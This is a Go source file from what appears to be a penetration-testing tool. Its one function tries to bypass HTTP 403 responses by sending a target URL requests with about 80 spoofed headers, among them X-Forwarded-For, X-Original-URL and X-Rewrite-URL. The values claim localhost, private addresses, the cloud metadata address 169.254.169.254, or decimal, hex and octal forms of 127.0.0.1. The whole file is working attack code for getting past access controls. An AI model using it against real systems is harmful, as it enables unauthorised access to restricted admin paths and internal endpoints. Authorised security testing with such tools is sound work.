package bypass

import (
	"net/http"
)

// TestIPSpoofingHeaders tests IP spoofing headers to bypass 403 responses
func TestIPSpoofingHeaders(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result

	ipHeaders := []struct {
		Header string
		Value  string
	}{
		{"X-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-Host", "127.0.0.1"},
		{"X-Host", "127.0.0.1"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"X-Originating-IP", "127.0.0.1"},
		{"X-Remote-IP", "127.0.0.1"},
		{"X-Client-IP", "127.0.0.1"},
		{"X-Real-IP", "127.0.0.1"},
		{"X-Forwarded", "127.0.0.1"},
		{"Forwarded-For", "127.0.0.1"},
		{"X-ProxyUser-IP", "127.0.0.1"},
		{"Via", "1.1 127.0.0.1"},
		{"Client-IP", "127.0.0.1"},
		{"True-Client-IP", "127.0.0.1"},
		{"Cluster-Client-IP", "127.0.0.1"},
		{"X-Forwarded-For", "localhost"},
		{"X-Forwarded-For", "10.0.0.1"},
		{"X-Forwarded-For", "192.168.1.1"},
		{"X-Forwarded-For", "127.0.0.1, 127.0.0.2"},
		{"X-Originally-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-For", "http://127.0.0.1"},
		{"X-Forwarded-For", "127.0.0.1:80"},
		{"X-Originating", "http://127.0.0.1"},
		{"X-WAP-Profile", "127.0.0.1"},
		{"X-Arbitrary", "http://127.0.0.1"},
		{"X-HTTP-DestinationURL", "http://127.0.0.1"},
		{"X-Forwarded-Proto", "http://127.0.0.1"},
		{"Destination", "127.0.0.1"},
		{"X-Client-IP", "http://127.0.0.1"},
		{"X-Host", "http://127.0.0.1"},
		{"X-Forwarded-Host", "http://127.0.0.1"},
		{"X-Forwarded-Port", "4443"},
		{"X-Forwarded-Port", "80"},
		{"X-Forwarded-Port", "8080"},
		{"X-Forwarded-Port", "8443"},
		{"X-ProxyUser-Ip", "127.0.0.1"},
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin"},
		{"X-Originating-URL", "/admin"},
		{"X-Forwarded-Server", "localhost"},
		{"X-Forwarded-Scheme", "http"},
		{"X-Original-Remote-Addr", "127.0.0.1"},
		{"X-Forwarded-Protocol", "http"},
		{"X-Original-Host", "localhost"},
		{"Proxy-Host", "localhost"},
		{"Request-Uri", "/admin"},
		{"X-Server-IP", "127.0.0.1"},
		{"X-Forwarded-SSL", "off"},
		{"X-Original-URL", "127.0.0.1"},
		{"X-Client-Port", "443"},
		{"X-Backend-Host", "localhost"},
		{"X-Remote-Addr", "127.0.0.1"},
		{"X-Remote-Port", "443"},
		{"X-Host-Override", "localhost"},
		{"X-Forwarded-Server", "localhost:80"},
		{"X-Host-Name", "localhost"},
		{"X-Proxy-URL", "http://127.0.0.1"},
		{"Base-Url", "http://127.0.0.1"},
		{"HTTP-X-Forwarded-For", "127.0.0.1"},
		{"HTTP-Client-IP", "127.0.0.1"},
		{"HTTP-X-Real-IP", "127.0.0.1"},
		{"Proxy-Url", "http://127.0.0.1"},
		{"X-Forward-For", "127.0.0.1"},
		{"X-Forwarded", "127.0.0.1"},
		{"Forwarded-For-Ip", "127.0.0.1"},
		{"X-Forwarded-By", "127.0.0.1"},
		{"X-Forwarded-For-Original", "127.0.0.1"},
		{"X-Forwarded-Host-Original", "localhost"},
		{"X-Pwnage", "127.0.0.1"},
		{"X-Bypass", "127.0.0.1"},
		// Internal IP addresses to try
		{"X-Forwarded-For", "0.0.0.0"},
		{"X-Forwarded-For", "127.0.0.2"},
		{"X-Forwarded-For", "10.0.0.0"},
		{"X-Forwarded-For", "172.16.0.0"},
		{"X-Forwarded-For", "192.168.0.1"},
		{"X-Forwarded-For", "169.254.169.254"}, // AWS metadata endpoint
		{"X-Forwarded-For", "2130706433"},      // 127.0.0.1 as decimal
		{"X-Forwarded-For", "0x7f000001"},      // 127.0.0.1 as hex
		{"X-Forwarded-For", "017700000001"},    // 127.0.0.1 as octal
	}

	for _, ipHeader := range ipHeaders {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)
		req.Header.Set(ipHeader.Header, ipHeader.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "IP Spoofing: " + ipHeader.Header,
		})
	}

	return results, nil
}
